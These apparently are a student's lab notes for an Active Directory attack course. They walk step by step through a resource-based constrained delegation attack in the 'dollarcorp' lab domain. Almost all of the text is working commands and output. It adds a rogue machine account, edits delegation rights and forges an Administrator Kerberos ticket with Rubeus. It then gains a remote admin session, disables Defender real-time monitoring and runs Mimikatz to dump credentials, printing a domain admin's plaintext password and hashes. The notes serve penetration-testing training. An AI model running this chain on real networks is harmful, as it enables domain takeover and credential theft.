#### Theory can be found in [[2. Domain Privilege Escalation#5. RBCD]] ####

- Enumerate for interesting ACL for domain users.
```
PS C:\AD\MyTools> Find-InterestingDomainACL | Where-Object -Property IdentityReferenceClass -Contains user


ObjectDN                : CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ListChildren, ReadProperty, GenericWrite
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-719815819-3726368948-3917688648-1121
IdentityReferenceName   : ciadmin
IdentityReferenceDomain : dollarcorp.moneycorp.local
IdentityReferenceDN     : CN=ci admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
IdentityReferenceClass  : user
```

- Make all Tools fully available to `dcorp\ciadmin`.
```
PS C:\AD\MyTools> icacls.exe C:\AD\MyTools\* /grant:r dcorp\ciadmin:F
processed file: C:\AD\MyTools\10k-worst-pass.txt
processed file: C:\AD\MyTools\20230811002659_BloodHound.zip
processed file: C:\AD\MyTools\ADModule-master
processed file: C:\AD\MyTools\amsibypass.txt
processed file: C:\AD\MyTools\Certify.exe
processed file: C:\AD\MyTools\hashes.asreproast
processed file: C:\AD\MyTools\hfs.exe
processed file: C:\AD\MyTools\hosts.txt
processed file: C:\AD\MyTools\InviShell
processed file: C:\AD\MyTools\Invoke-Kerberoast.ps1
processed file: C:\AD\MyTools\Invoke-Mimi.ps1
processed file: C:\AD\MyTools\Invoke-Mimikatz.ps1
processed file: C:\AD\MyTools\Invoke-PowerShellTcp.ps1
processed file: C:\AD\MyTools\Invoke-Test.ps1
processed file: C:\AD\MyTools\mimikatz.exe
processed file: C:\AD\MyTools\MS-RPRN.exe
processed file: C:\AD\MyTools\nc64.exe
processed file: C:\AD\MyTools\netcat-win32-1.12.zip
processed file: C:\AD\MyTools\OGM1YTI1MzQtMTU4Mi00NWMyLTk2N2YtMWNkYTlkMjE4NTM3.bin
processed file: C:\AD\MyTools\Powermad
processed file: C:\AD\MyTools\PowerUp.ps1
processed file: C:\AD\MyTools\PowerUpSQL
processed file: C:\AD\MyTools\PowerView.ps1
processed file: C:\AD\MyTools\PrivescCheck.ps1
processed file: C:\AD\MyTools\PsExec64.exe
processed file: C:\AD\MyTools\Rubeus.exe
processed file: C:\AD\MyTools\sbloggingbypass.txt
processed file: C:\AD\MyTools\SharpHound.ps1
processed file: C:\AD\MyTools\SharpHoundv2.exe
Successfully processed 29 files; Failed processing 0 files
```

- Open a new PowerShell session as `dcorp\ciadmin`.
```
PS C:\AD\MyTools> runas.exe /user:dcorp\ciadmin powershell
```

- Use `powercat.ps1` (after uploading it to our attack machine) to add a new attacker-controlled computer account.
```
PS C:\AD\MyTools> C:\AD\MyTools\InviShell\RunWithRegistryNonAdmin.bat

<snip>

PS C:\AD\MyTools> ipmo .\PowerView.ps1
PS C:\AD\MyTools> cd .\Powermad\Powermad\
PS C:\AD\MyTools\Powermad\Powermad> ipmo .\Powermad.psd1
PS C:\AD\MyTools\Powermad\Powermad> New-MachineAccount -MachineAccount WS07 -Password $(ConvertTo-SecureString 'Summer2023!' -AsPlainText -Force)
[+] Machine account WS07 added
```

- Retrieve the security identifier (SID) of the newly created computer account.
```
PS C:\AD\MyTools\Powermad\Powermad> $ComputerSid = Get-DomainComputer WS07 -Properties objectsid | Select -Expand objectsid
```

- Build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE.
```
PS C:\AD\MyTools\Powermad\Powermad> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
PS C:\AD\MyTools\Powermad\Powermad> $SDBytes = New-Object byte[] ($SD.BinaryLength)
PS C:\AD\MyTools\Powermad\Powermad> $SD.GetBinaryForm($SDBytes, 0)
```

- Set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over.
```
PS C:\AD\MyTools\Powermad\Powermad> Get-DomainComputer dcorp-mgmt.dollarcorp.moneycorp.local | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
VERBOSE: [Get-DomainObject] Extracted domain 'dollarcorp.moneycorp.local' from
'CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local'
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(|(distinguishedname=CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local))
VERBOSE: [Get-DomainSearcher] search base: LDAP://DC=dollarcorp,DC=moneycorp,DC=local
VERBOSE: [Invoke-LDAPQuery] filter string:
(&(|(distinguishedname=CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local)))
VERBOSE: [Get-DomainObject] Error disposing of the Results object: Method invocation failed because
[System.DirectoryServices.SearchResult] does not contain a method named 'dispose'.
VERBOSE: [Set-DomainObject] Setting 'msds-allowedtoactonbehalfofotheridentity' to '1 0 4 128 20 0 0 0 0 0 0 0 0 0 0 0 36 0 0
 0 1 2 0 0 0 0 0 5 32 0 0 0 32 2 0 0 2 0 44 0 1 0 0 0 0 0 36 0 255 1 15 0 1 5 0 0 0 0 0 5 21 0 0 0 139 132 231 42 180 224 27
 222 72 47 131 233 207 66 0 0' for object 'DCORP-MGMT$'
```

- Use Rubeus to hash the plaintext password into its RC4_HMAC form.
```
PS C:\AD\MyTools> .\Rubeus.exe hash /password:Summer2023! /user:ws07$ /domain:dollarcorp.moneycorp.local

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3


[*] Action: Calculate Password Hash(es)

[*] Input password             : Summer2023!
[*] Input username             : ws07$
[*] Input domain               : dollarcorp.moneycorp.local
[*] Salt                       : DOLLARCORP.MONEYCORP.LOCALhostws07.dollarcorp.moneycorp.local
[*]       rc4_hmac             : 4EA072DB1483A7DF8643772B6B25CB43
[*]       aes128_cts_hmac_sha1 : 37026FEE193427E90124DB77B4E6ACA4
[*]       aes256_cts_hmac_sha1 : 4BDC5786B5A9DA6964EF8CC42CE6599E0851FC0273D34C66468FA1E1738C87E3
[*]       des_cbc_md5          : A8DC3762AEAB893E
```

- Use Rubeus (S4U module) to request a TGS for the service name we want to pretend to have administrative privileges for.
```
PS C:\AD\MyTools> .\Rubeus.exe s4u /user:WS07$ /rc4:4EA072DB1483A7DF8643772B6B25CB43 /impersonateuser:Administrator /msdsspn:http/dcorp-mgmt.dollarcorp.moneycorp.local /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: S4U

[*] Using rc4_hmac hash: 4EA072DB1483A7DF8643772B6B25CB43
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\WS07$'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIF4DCCBdygAwIBBaEDAgEWooIEzjCCBMphggTGMIIEwqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3JwLm1vbmV5Y29ycC5sb2NhbKOCBGowggRmoAMCARKhAwIBAqKCBFgEggRU8t3pyphpG+KBpVQuwm90XDdaSQYiNFyfa2N3OCaSB5+YP+wqedH2Oe+Y5m40+wK2POz0WQp9PaEJuoDHCmsxHFJZGOY2TTRw87IX2EW8FS7zPnZ4y6JraMHzFbk5YpzlAWHH1gNs0BiSeu7pCYEfSXSvj+1xGc6OzVpwVcGtVHEKpKd3vvBjnFN0LSt22lHkO6WUS18j5YqmN9S/rxMun/91f+bDhnNHTvfLGXfmnw8lNE/2VC3mA4dVjYmeZz7fIQYwklE5zZEKcJkwWDAHng2DFMIuiWXbiGd+oAuHfkIK6mjjLtczwKBW1Z7H5AAeKlwtkxglgQYUZaG/tc3mh3oN1nhvo8gpB/G8fW+gclvk3+xRccu/14Oi4r3PtjV4vhebU5ZS95F6GH99YcV2mHNjTcVQ/FsBt6vW0OH/xbhAlKvupuMiSUvu51mZkSmNXEX5WcyVBJumiTrp9uYsfeTh9TsB7atGvXdR9dgegb3JGTXZ4K29KRMpGuAYOn9boX9+FmyPryKfHP5UUMaX7y+oJqxCyi9M6730PsXN1mUs6/8S/zHS2mpnHjFINpqlqmexOIzN3B+Aiowssieu9uafNnJpu+onq4CpZLxPCjWZebJBxQGD+bloKvceXnEZk1KRt9L5Smw4b/Jcik4y93mSTFearS2IfeyOLRcp4+vGtqjY6jAV4lQZOHKIEwjScap4+osuI9s1k8BxjB5+GMiHHk/rK4m1X8qrr6IyFRb6Pq0+4AGiBgl6oFDHmYkUfhLX9LFXh0po9S8vONjbiGL7fPrs0I+E96xNYhODSxt7Z8qlWofL2iRBrXHcCht+aDWCQsBebJqMYFNG6Z/MtQhV8fvvpQ3VRCSWF0+G/xIuJJHmQu6QQ/7JMJ4K6V4fXVBwk0+QpEMuMvowmUvLdG74AUF749j8B1JqxdusBGPBTTcGT8VKUGlv3RXvijIlbSCU9oOjjp+ywZDlNZU7MM/U7qxsg6axuWuyHqKhks19xZ0sQMByDpU/53xWgePFavku/MjjygLNAZ8+5F5IUHbbbSc+HOkqSiBU4GFMxYiuKCVdWaFNYaytv9hCP7LD8puoXDkINjgYJoPj7kH1IWsxhPliqRXo9qYKfs/3Z4gcBYB/hYlKJ31YoFhDnjXuVlvX4+t1GMI+Y6WjOeSW1NOeAHVnkDYV0Aeyi/FlG/XWG+kpkDDB8mr//w7ZUX5k1ncgeApYOyB9SR4kjK/3ihPp9zyJdJbCib4AjoM5GtyMjW8nzQ9y5/kHfzcT8Zt+7yTOJOqbpnp0BXBQgQipLFl+D030KH71KERqRWshzZBvu6/13jNuJMF6E0BLYY/GAZkRxfRrHF+KDlRT2xi5VsX3s91CQvFQ69vmCh0wlZ/UpLrg2/vqN3AOUA5canwAHj0+CQVa6KYJQqVTAdTRGNg3NNtk73gyZ46p4YlkEv9DISrNejY9bPG9+9ZCRiC20GAeVaOB/TCB+qADAgEAooHyBIHvfYHsMIHpoIHmMIHjMIHgoBswGaADAgEXoRIEEK9eZoFPEOb8oaQC8qUbCrWhHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUyiEjAQoAMCAQGhCTAHGwVXUzA3JKMHAwUAQOEAAKURGA8yMDIzMDgyMDE4MjI1OFqmERgPMjAyMzA4MjEwNDIyNThapxEYDzIwMjMwODI3MTgyMjU4WqgcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKkvMC2gAwIBAqEmMCQbBmtyYnRndBsaZG9sbGFyY29ycC5tb25leWNvcnAubG9jYWw=


[*] Action: S4U

[*] Building S4U2self request for: 'WS07$@DOLLARCORP.MONEYCORP.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2self request to 172.16.2.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator' to 'WS07$@DOLLARCORP.MONEYCORP.LOCAL'
[*] base64(ticket.kirbi):

      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

[*] Impersonating user 'Administrator' to target SPN 'http/dcorp-mgmt.dollarcorp.moneycorp.local'
[*] Building S4U2proxy request for service: 'http/dcorp-mgmt.dollarcorp.moneycorp.local'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2proxy request to domain controller 172.16.2.1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'http/dcorp-mgmt.dollarcorp.moneycorp.local':

      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
```

- Use the generated TGS to access `DCORP-MGMT` from a session as `dcorp\student303` (`dcorp\ciadmin` is already a local administrator in `DCORP-MGMT` so we will be able to remotely access the server in any case).
```
PS C:\AD\MyTools> .\Rubeus.exe ptt /ticket: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

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3


[*] Action: Import Ticket
[+] Ticket successfully imported!
PS C:\AD\MyTools> Enter-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local
[dcorp-mgmt.dollarcorp.moneycorp.local]: PS C:\Users\Administrator.dcorp\Documents> hostname
dcorp-mgmt
[dcorp-mgmt.dollarcorp.moneycorp.local]: PS C:\Users\Administrator.dcorp\Documents> whoami
dcorp\administrator
```

- Dig for credentials in `DCORP-MGMT`.
```
[dcorp-mgmt.dollarcorp.moneycorp.local]: PS C:\Windows\Tasks> Set-MpPreference -DisableRealtimeMonitoring $true
[dcorp-mgmt.dollarcorp.moneycorp.local]: PS C:\Windows\Tasks> net use N: \\172.16.100.3\MyTools /user:dcorp\student303 a5fdNPDwScrD7T2A
The command completed successfully.
[dcorp-mgmt.dollarcorp.moneycorp.local]: PS C:\Windows\Tasks> cp //172.16.100.3/MyTools/Invoke-Mimikatz.ps1 .
[dcorp-mgmt.dollarcorp.moneycorp.local]: PS C:\Windows\Tasks> Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords" "exit"'
Authentication Id : 0 ; 58872 (00000000:0000e5f8)
Session           : Service from 0
User Name         : svcadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 3/4/2023 2:15:24 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1118
        msv :
         [00000003] Primary
         * Username : svcadmin
         * Domain   : dcorp
         * NTLM     : b38ff50264b74508085d82c69794a4d8
         * SHA1     : a4ad2cd4082079861214297e1cae954c906501b9
         * DPAPI    : f26ae0cc48396dccd8caa24cd33127e7
        tspkg :
        wdigest :
         * Username : svcadmin
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : svcadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : *ThisisBlasphemyThisisMadness!!
        ssp :
        credman :
        
<snip>

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DCORP-MGMT$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 3/4/2023 2:15:19 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : DCORP-MGMT$
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : dcorp-mgmt$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
        ssp :
        credman :

mimikatz(powershell) # exit
Bye!
```

- `dcorp\svcadmin` is a DA.